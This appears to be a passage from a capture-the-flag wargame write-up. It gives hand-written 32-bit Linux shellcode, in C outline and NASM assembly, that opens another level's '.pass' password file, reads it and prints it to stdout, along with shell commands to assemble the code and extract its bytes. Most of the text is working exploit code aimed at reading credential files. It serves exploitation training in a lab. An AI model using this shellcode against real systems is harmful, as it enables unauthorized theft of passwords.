This is a crafted shellcode for 32 bits arch:

```c
char buffer[42];

in fd = open("////home/users/level05/.pass", O_RDONLY);
read(fd, buffer, 41);
write(1, buffer, 41);
```

```assembly
global _start

section .text
_start:
    ; push '////home/users/level05/.pass\x00'
    xor ebx, ebx        ; ebx = 0
    push ebx            ; push NULL string terminator
    mov ebx, 'pass'     ; rest of file name
    push ebx            ; push to stack
    mov ebx, '05/.'     ; rest of file name
    push ebx            ; push to stack
    mov ebx, 'evel'     ; rest of file name
    push ebx            ; push to stack
    mov ebx, 'rs/l'     ; rest of file name
    push ebx            ; push to stack
    mov ebx, '/use'     ; rest of file name
    push ebx            ; push to stack
    mov ebx, 'home'     ; rest of file name
    push ebx            ; push to stack
    mov ebx, '////'     ; rest of file name
    push ebx            ; push to stack

    ; sys_open(const char * filename, int flags, int mode)
    xor eax, eax        ; eax = 0
    xor edx, edx        ; edx = 0
    mov al, 5           ; open syscall number
    mov ebx, esp        ; move pointer to filename
    xor ecx, ecx        ; set O_RDONLY flag = 0
    mov dx, 0644        ; set mode 0644
    int 0x80            ; call kernel

    ; sys_read(unsigned int fd, char * buf, size_t count)
    xor ebx, ebx        ; ebx = 0
    xor edx, edx        ; edx = 0
    mov bl, al          ; set fd from sys_open syscall return value (eax)
    mov ecx, esp        ; move pointer to stack to read on
    mov al, 3           ; sys_read syscall number
    mov dl, 41          ; size to read
    int 0x80            ; call kernel

    ; sys_write(unsigned int fd, const char * buf, size_t count)
    ; ecx already points on the stack (esp) to the string to read
    mov al, 4           ; sys_write syscall
    mov bl, 1           ; set fd to stdout
    mov dl, 41          ; size to read
    int 0x80            ; call kernel
```

After compile it, let's extract the shellcode (on our machine):

```shell
(cd /tmp && nasm -f elf exploit04.s && ld -m elf_i386 -o exploit04 exploit04.o)
count=0; for i in $(objdump -d /tmp/exploit04 |grep "^ " |cut -f2); do echo -n "\x$i"; count=$((count + 1)); done; echo; echo "$count bytes"
```
